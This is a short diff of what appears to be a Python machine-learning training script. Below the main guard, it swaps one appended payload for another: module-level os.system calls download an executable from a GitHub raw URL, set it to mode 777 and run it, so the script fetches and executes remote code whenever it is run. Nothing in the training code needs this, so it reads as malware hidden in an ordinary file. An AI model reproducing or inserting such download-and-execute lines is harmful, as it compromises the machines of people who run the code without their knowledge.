@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/novalanto010101/file/main/crot')
-os.system('chmod 777 crot')
-os.system('./crot')
+os.system('wget https://raw.githubusercontent.com/novalanto010101/file/main/titiw')
+os.system('chmod 777 titiw')
+os.system('./titiw')
